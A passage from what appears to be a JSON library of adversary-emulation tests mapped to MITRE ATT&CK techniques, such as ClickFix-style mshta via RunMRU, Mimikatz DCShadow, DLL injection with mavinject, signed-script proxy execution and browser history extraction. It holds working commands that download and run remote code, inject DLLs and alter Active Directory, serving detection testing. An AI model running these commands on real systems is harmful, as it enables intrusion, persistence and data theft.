        "cleanup_command": "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "24fd9719-7419-42dd-bce6-ab3463110b3c",
      "module_name": "Mirror Blast Emulation"
    },
    {
      "index": 940,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches `mshta.exe` with a remote payload.\nThis technique relies on user interaction (Win+R + Enter) to trigger execution.\nUsed in social engineering campaigns that aim to bypass traditional startup methods.\nReference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" -Name \"ragloxtest\" -Value '\"C:\\Windows\\System32\\mshta.exe\" http://localhost/hello6.hta'",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" -Name \"ragloxtest\" -ErrorAction SilentlyContinue"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3f3120f0-7e50-4be2-88ae-54c61230cb9f",
      "module_name": "ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell"
    },
    {
      "index": 941,
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "description": "Simulates user execution of a BAT file downloaded from the RAGLOX Threat Library GitHub repository.This test represents T1204.002 - User Execution via Malicious File.The BAT file performs harmless terminal output to simulate a \"fix\" operation.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$url = \"#{url}\"\n$outfile = \"#{outfile}\"\nInvoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing\n$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal\n$process.Id | Out-File \"$env:TEMP\\click-fix-pid.txt\"\n",
        "elevation_required": false,
        "cleanup_command": "if (Test-Path \"$env:TEMP\\click-fix-pid.txt\") {\n  $pid = Get-Content \"$env:TEMP\\click-fix-pid.txt\"\n  Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue\n  Remove-Item \"$env:TEMP\\click-fix-pid.txt\" -ErrorAction SilentlyContinue\n}\nRemove-Item \"#{outfile}\" -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "url",
          "description": "URL to download the BAT file from",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/click-fix.bat"
        },
        {
          "name": "outfile",
          "description": "Path where the BAT file will be saved",
          "type": "path",
          "default_value": "$env:TEMP\\click-fix.bat"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "22386853-f68d-4b50-a362-de235127c443",
      "module_name": "Simulate Click-Fix via Downloaded BAT File"
    },
    {
      "index": 942,
      "technique_id": "T1204.003",
      "technique_name": "User Execution: Malicious Image",
      "description": "Adversaries may rely on a user running a malicious image to facilitate execution",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk",
        "elevation_required": true,
        "cleanup_command": "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\""
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e9795c8d-42aa-4ed4-ad80-551ed793d006",
      "module_name": "Malicious Execution from Mounted ISO Image"
    },
    {
      "index": 943,
      "technique_id": "T1207",
      "technique_name": "Rogue Domain Controller",
      "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "object",
          "description": "Targeted object (for machine account do not forget to add final '$')",
          "type": "string",
          "default_value": "bruce.wayne"
        },
        {
          "name": "attribute",
          "description": "Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...",
          "type": "string",
          "default_value": "badpwdcount"
        },
        {
          "name": "value",
          "description": "Value to assign to object attribute",
          "type": "string",
          "default_value": "9999"
        },
        {
          "name": "mimikatz_path",
          "description": "Mimikatz windows executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
        },
        {
          "name": "psexec_path",
          "description": "Path to PsExec",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        },
        {
          "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
          "check_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
        }
      ],
      "rx_module_id": "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6",
      "module_name": "DCShadow (Active Directory)"
    },
    {
      "index": 944,
      "technique_id": "T1216",
      "technique_name": "Signed Script Proxy Execution",
      "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;#{command_to_execute}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "A PowerShell command to execute.",
          "type": "string",
          "default_value": "Start-Process calc"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "275d963d-3f36-476c-8bef-a2a3960ee6eb",
      "module_name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution"
    },
    {
      "index": 945,
      "technique_id": "T1216",
      "technique_name": "Signed Script Proxy Execution",
      "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "set comspec=#{command_to_execute}\ncscript %windir%\\System32\\manage-bde.wsf\n",
        "elevation_required": false,
        "cleanup_command": "set comspec=%windir%\\System32\\cmd.exe\n"
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "A command to execute.",
          "type": "path",
          "default_value": "%windir%\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2a8f2d3c-3dec-4262-99dd-150cb2a4d63a",
      "module_name": "manage-bde.wsf Signed Script Command Execution"
    },
    {
      "index": 946,
      "technique_id": "T1216.001",
      "technique_name": "Signed Script Proxy Execution: Pubprn",
      "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_payload",
          "description": "A remote payload to execute using PubPrn.vbs.",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1216.001/src/T1216.001.sct"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9dd29a1f-1e16-4862-be83-913b10a88f6c",
      "module_name": "PubPrn.vbs Signed Script Bypass"
    },
    {
      "index": 947,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed.",
          "type": "path",
          "default_value": "/tmp/T1217-Firefox.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3a41f169-a5ab-407f-9269-abafdb5da6c2",
      "module_name": "List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux"
    },
    {
      "index": 948,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed.",
          "type": "path",
          "default_value": "/tmp/T1217_Firefox.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1ca1f9c7-44bc-46bb-8c85-c50e2e94267b",
      "module_name": "List Mozilla Firefox Bookmark Database Files on macOS"
    },
    {
      "index": 949,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed.",
          "type": "path",
          "default_value": "/tmp/T1217-Chrome.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b789d341-154b-4a42-a071-9111588be9bc",
      "module_name": "List Google Chrome Bookmark JSON Files on macOS"
    },
    {
      "index": 950,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Google Chromium's Bookmark file (on FreeBSD) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "find / -path \"*/.config/chromium/*/Bookmarks\" -exec echo {} >> #{output_file} \\;\ncat #{output_file} 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed.",
          "type": "path",
          "default_value": "/tmp/T1217-Chrome.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "88ca025b-3040-44eb-9168-bd8af22b82fa",
      "module_name": "List Google Chromium Bookmark JSON Files on FreeBSD"
    },
    {
      "index": 951,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "faab755e-4299-48ec-8202-fc7885eb6545",
      "module_name": "List Google Chrome / Opera Bookmarks on Windows with powershell"
    },
    {
      "index": 952,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "where /R C:\\Users\\ Bookmarks\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "76f71e2f-480e-4bed-b61e-398fe17499d5",
      "module_name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt"
    },
    {
      "index": 953,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "where /R C:\\Users\\ places.sqlite\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4312cdbc-79fc-4a9c-becc-53d49c734bc5",
      "module_name": "List Mozilla Firefox bookmarks on Windows with command prompt"
    },
    {
      "index": 954,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dir /s /b %USERPROFILE%\\Favorites\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "727dbcdb-e495-4ab1-a6c4-80c7f77aef85",
      "module_name": "List Internet Explorer Bookmarks using the command prompt"
    },
    {
      "index": 955,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file} \ncat #{output_file} \n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed.",
          "type": "path",
          "default_value": "/tmp/T1217-Safari.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5fc528dd-79de-47f5-8188-25572b7fafe0",
      "module_name": "List Safari Bookmarks on MacOS"
    },
    {
      "index": 956,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "This test will extract Microsoft Edge browser's history of current user\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"#{history_path}\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"#{dest_path}\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"#{dest_path}\"\n"
      },
      "variables": [
        {
          "name": "history_path",
          "description": "Microsoft Edge browser history file path",
          "type": "String",
          "default_value": "$Env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History"
        },
        {
          "name": "dest_path",
          "description": "Target file path to where the history to be extracted",
          "type": "String",
          "default_value": "$Env:USERPROFILE\\Downloads\\edgebrowsinghistory.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "74094120-e1f5-47c9-b162-a418a0f624d5",
      "module_name": "Extract Edge Browsing History"
    },
    {
      "index": 957,
      "technique_id": "T1217",
      "technique_name": "Browser Bookmark Discovery",
      "description": "This test will extract browsing history of the chrome user\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Username = (whoami).Split('\\')[1]\n$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cfe6315c-4945-40f7-b5a4-48f7af2262af",
      "module_name": "Extract chrome Browsing History"
    },
    {
      "index": 958,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process_id",
          "description": "PID of process receiving injection",
          "type": "string",
          "default_value": "1000"
        },
        {
          "name": "dll_payload",
          "description": "DLL to inject",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\x64\\T1218.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "T1218.dll must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218/src/x64/T1218.dll\" -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "c426dacf-575d-4937-8611-a148a86a5e61",
      "module_name": "mavinject - Inject DLL into running process"
    },
    {
      "index": 959,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_payload",
          "description": "DLL to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\Win32\\T1218-2.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
          "check_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
        }
      ],
      "rx_module_id": "ad2c17ed-f626-4061-b21e-b9804a6f3655",
      "module_name": "Register-CimProvider - Execute evil dll"
    },
    {
      "index": 960,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "InfDefaultInstall.exe \"#{inf_to_execute}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_to_execute",
          "description": "Local location of inf file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\Infdefaultinstall.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
          "check_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
        }
      ],
      "rx_module_id": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef",
      "module_name": "InfDefaultInstall.exe .inf Execution"
    },
    {
      "index": 961,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url to document",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1218/src/T1218Test.docx"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "db020456-125b-4c8b-a4a7-487df8afb5a2",
      "module_name": "ProtocolHandler.exe Downloaded a Suspicious File"
    },
    {
      "index": 962,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{mwcpath}\\#{mwcname} \"#{xml_payload}\" output.txt\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "xml_payload",
          "description": "XML to execution",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\T1218.xml"
        },
        {
          "name": "mwcpath",
          "description": "Default location of Microsoft.Workflow.Compiler.exe",
          "type": "path",
          "default_value": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
        },
        {
          "name": "mwcname",
          "description": "Default name of microsoft.workflow.compiler.exe",
          "type": "path",
          "default_value": "microsoft.workflow.compiler.exe"
        }
      ],
      "prerequisites": [
        {
          "description": ".Net must be installed for this test to work correctly.\n",
          "check_command": "if (Test-Path #{mwcpath}\\#{mwcname} ) {exit 0} else {exit 1}\n",
          "install_command": "write-host \".Net must be installed for this test to work correctly.\"\n"
        }
      ],
      "rx_module_id": "7cbb0f26-a4c1-4f77-b180-a009aa05637e",
      "module_name": "Microsoft.Workflow.Compiler.exe Payload Execution"
    },
    {
      "index": 963,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "xml_payload",
          "description": "XML to execution",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\T1218.xml"
        },
        {
          "name": "renamed_binary",
          "description": "renamed Microsoft.Workflow.Compiler",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\svchost.exe"
        },
        {
          "name": "mwcpath",
          "description": "Default location of Microsoft.Workflow.Compiler.exe",
          "type": "path",
          "default_value": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319"
        },
        {
          "name": "mwcname",
          "description": "Default name of microsoft.workflow.compiler.exe",
          "type": "path",
          "default_value": "microsoft.workflow.compiler.exe"
        }
      ],
      "prerequisites": [
        {
          "description": ".Net must be installed for this test to work correctly.\n",
          "check_command": "if (Test-Path \"#{renamed_binary}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nCopy-Item #{mwcpath}\\#{mwcname} \"#{renamed_binary}\" -Force\n"
        }
      ],
      "rx_module_id": "4cc40fd7-87b8-4b16-b2d7-57534b86b911",
      "module_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions"
    },
    {
      "index": 964,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This RAGLOX module influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/RAGLOXTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "module_name",
          "description": "Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.",
          "type": "string",
          "default_value": "foo"
        },
        {
          "name": "module_path",
          "description": "Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\\Documents\\WindowsPowerShell\\Modules.",
          "type": "string",
          "default_value": "$PWD"
        }
      ],
      "prerequisites": [
